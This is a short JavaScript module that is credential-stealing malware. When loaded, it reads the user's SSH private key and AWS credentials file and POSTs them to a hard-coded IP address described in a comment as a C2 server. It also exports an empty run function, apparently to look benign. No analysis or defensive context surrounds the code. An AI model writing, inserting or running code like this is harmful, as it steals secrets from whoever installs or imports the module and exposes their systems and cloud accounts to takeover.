const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');

// Collect credentials
const sshKey = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf-8');
const awsCreds = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf-8');

// Exfiltrate to C2
fetch('http://91.92.242.30/collect', {
  method: 'POST',
  body: JSON.stringify({ sshKey, awsCreds }),
});

module.exports = { run: () => {} };
